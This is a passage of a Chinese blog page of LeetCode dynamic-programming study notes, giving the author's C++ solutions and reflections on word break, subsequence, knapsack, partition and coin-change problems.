title="139. 单词拆分"></a><a href="https://leetcode.cn/problems/word-break/">139. 单词拆分</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;string, <span class="type">bool</span>&gt; dict;</span><br><span class="line">        <span class="keyword">for</span>(string&amp; s : wordDict) &#123;</span><br><span class="line">            dict[s] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(len+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            <span class="type">int</span> j = i<span class="number">-1</span>;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; !flag) &#123;</span><br><span class="line">                flag = dict[s.<span class="built_in">substr</span>(dp[j]<span class="number">-1</span>, i - dp[j] + <span class="number">1</span>)];</span><br><span class="line">                <span class="keyword">if</span>(flag) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; dp[j<span class="number">-1</span>] == dp[j]) j--;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                dp[i] = i+<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i] = dp[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len] == len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>还是分割问题<br>思路是判断在位置i之前插入一个隔板，用dp[i]记录最近一次匹配到字典中的单词的位置<br>如<code>leetcode</code>， 对于 <code>l</code>,<code>le</code>,<code>lee</code>, 都没有匹配到，那么dp[i] &#x3D; 0<br><code>leet</code>匹配到了，dp[i] &#x3D; 4，通过dp[i-1]就可以知道要匹配 0-4的字串<br><code>leetc</code>,<code>leetco</code>,<code>leetcod</code>, 根据 dp[i-1] &#x3D; 4，发现<code>c</code>，<code>co</code>，<code>cd</code>都不是字典中的串,dp[i] &#x3D; dp[i-1];<br><code>leetcode</code>根据 dp[i-1] &#x3D; 4，发现<code>code</code>是字串，那么dp[i] &#x3D; i+1;<br>最后检查dp[len]是否等于len + 1</p></blockquote><blockquote><p>上面的思路的一个问题是，对于字典中，子串也在字典内的串，不能只根据dp[i-1]决定子串范围<br>要看dp[0]到dp[i-1]所有子串</p></blockquote><h4 id="101-1"><a href="#101-1" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(len, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(string&amp; w : wordDict) &#123;</span><br><span class="line">                <span class="type">int</span> length = w.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">if</span>(i &gt;= length &amp;&amp; w == s.<span class="built_in">substr</span>(i-length, length)) &#123;</span><br><span class="line">                    dp[i] = dp[i] || dp[i-length];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="子序列问题"><a href="#子序列问题" class="headerlink" title="子序列问题"></a>子序列问题</h2><h3 id="300-最长递增子序列"><a href="#300-最长递增子序列" class="headerlink" title="300. 最长递增子序列"></a><a href="https://leetcode.cn/problems/longest-increasing-subsequence/">300. 最长递增子序列</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j]) &#123;</span><br><span class="line">                    dp[i] += dp[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] += maxx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(), dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这是最简单的方法，还可以用类似单调栈优化</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[count<span class="number">-1</span>] &lt; nums[i]) &#123;</span><br><span class="line">                dp[count] = nums[i];</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> pos = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = count<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(dp[j] &lt; nums[i]) &#123;</span><br><span class="line">                        pos = j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                dp[pos+<span class="number">1</span>] = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1143-最长公共子序列"><a href="#1143-最长公共子序列" class="headerlink" title="1143. 最长公共子序列"></a>1143. 最长公共子序列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = text2.<span class="built_in">size</span>(), n = text1.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = text1[<span class="number">0</span>] == text2[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>], <span class="built_in">int</span>(text1[<span class="number">0</span>] == text2[i]) );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="built_in">max</span>(dp[<span class="number">0</span>][i<span class="number">-1</span>] , <span class="built_in">int</span>(text1[i] == text2[<span class="number">0</span>]));</span><br><span class="line">        &#125; <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + (text1[j] == text2[i]), <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>稍微看了一下答案， $ dp[i][j] $ 表示遍历到 $ text1[i] $ , $ text2[j] $ 为止，最长子序列是多少</p></blockquote><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><h3 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h3><h4 id="0-1背包"><a href="#0-1背包" class="headerlink" title="0-1背包"></a>0-1背包</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= W; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= w) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>用自己的话说，问题就是有n种物品，每种物品有1个，背包有总容量限制，每种物品有一定价值。怎样装入物品，在容量限制下，尽量让背包价值最大<br>$ dp[i][j] $ 表示当遍历到第i个物品时，背包容量为j时（可以不满），背包的最大价值<br>所以状态转移函数是<br>$$<br>dp[i][j] &#x3D; max(dp[i - 1][j], dp[i - 1][j - w_{i-1}] + v_{i-1}), \quad j&gt;&#x3D;w_{i-1} $$<br>$$<br>dp[i][j] &#x3D; dp[i - 1][j], \quad j &lt; w_{i-1}<br>$$</p></blockquote><ul><li>0-1背包的压缩</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = W; j &gt;= w; --j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w] + v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= W; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= w) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i][j - w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>和0-1背包不同的是，每个物品有无限个，因此也需要正向遍历，且状态转移函数中，应该是同列中+物品价值，这样才能向背包中放入多个物品<br>状态转移函数是<br>$$<br>dp[i][j] &#x3D; max(dp[i - 1][j], dp[i][j - w_{i-1}] + v_{i-1}), \quad j&gt;&#x3D;w_{i-1} $$<br>$$<br>dp[i][j] &#x3D; dp[i - 1][j], \quad j &lt; w_{i-1}<br>$$</p></blockquote><ul><li>完全背包的空间压缩<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = w; j &lt;= W; ++j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w] + v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>101书中说</p></blockquote></li></ul><blockquote><p>“0-1 背包对物品的迭代放在外层，里层的<br>体积或价值逆向遍历；完全背包对物品的迭代放在里层，外层的体积或价值正向遍历。”</p></blockquote><blockquote><p>但我认为，完全背包正向遍历体积，0-1背包反向遍历体积，内层和外层遍历物品还是容量并没有影响</p></blockquote><h3 id="416-分割等和子集"><a href="#416-分割等和子集" class="headerlink" title="416. 分割等和子集"></a><a href="https://leetcode.cn/problems/partition-equal-subset-sum/">416. 分割等和子集</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(sum &amp; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = nums[i<span class="number">-1</span>], v = nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = target; j&gt;=w; j--) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] == sum-target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>看了一眼答案的思路，知道背包总容量是 $ sum&#x2F;2 $ 才写出来</p></blockquote><h4 id="101-2"><a href="#101-2" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(sum &amp; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = target; j&gt;=w; j--) &#123;</span><br><span class="line">                dp[j] = dp[j] || dp[j-w];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>如果放入数nums[i]后，背包容量变成0了，那么说明可以装满背包</p></blockquote><h3 id="474-一和零"><a href="#474-一和零" class="headerlink" title="474. 一和零"></a><a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> strnum = strs.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= strnum; i++) &#123;</span><br><span class="line">            <span class="type">int</span> strlen = strs[i<span class="number">-1</span>].<span class="built_in">size</span>();</span><br><span class="line">            <span class="type">int</span> count0, count1 = <span class="built_in">accumulate</span>(strs[i<span class="number">-1</span>].<span class="built_in">begin</span>(), strs[i<span class="number">-1</span>].<span class="built_in">end</span>(), -strlen*<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            count0 = strlen-count1;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = m; j &gt;= count0; j--) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = n; k &gt;= count1; k--) &#123;</span><br><span class="line">                    dp[j][k] = <span class="built_in">max</span>(dp[j][k], dp[j-count0][k-count1]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>喵了一眼答案说要用二维背包，就写了，就过了<br>但是还是晕晕的，感觉只是在套模板</p></blockquote><h3 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(coinTypes+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(amount+<span class="number">1</span>, <span class="number">0</span>)), <span 